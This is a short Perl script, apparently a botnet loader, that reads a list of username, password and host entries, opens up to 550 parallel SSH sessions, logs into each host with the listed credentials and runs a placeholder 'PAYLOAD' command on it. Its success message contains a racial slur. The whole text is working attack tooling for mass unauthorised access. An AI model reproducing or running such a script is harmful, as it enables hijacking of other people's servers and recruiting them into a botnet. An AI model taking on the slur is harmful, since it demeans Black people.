#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('PAYLOAD');
                        sleep 10;
                        $channel->close;
                        print "\e[37;1mNigga They Joining: ".$newarray[$c]."\n";
                } else {
                        print "Maybe\n";
                }
        } else {
                print "Box Broken\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

